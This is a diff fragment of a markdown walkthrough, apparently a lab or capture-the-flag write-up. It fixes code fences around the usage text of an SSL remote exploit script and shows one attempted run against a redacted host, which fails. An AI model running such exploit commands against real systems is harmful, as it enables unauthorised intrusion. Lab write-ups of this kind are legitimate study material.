@@ -59,14 +59,14 @@ Now we need to find out how to use it properly, so run the script
 
 It presents us with:
 
-```
+``
 : Usage: ./script target box [port] [-c N
 
   target - supported box eg: 0x00
   box - hostname or IP address
   port - port for ssl connection
   -c open N connections. (use range 40-50 if u dont know
-```
+``
 
 and a long list of supported offsets to place instead of 'target'
 
@@ -75,7 +75,6 @@ Ours is likely to be either 0x6a or 0x6b so we'll try 0x6a first
 ```
 ./exploit 0x6a x.x.x.104 -c 40
 ```
-
 
 Unsucessful
 
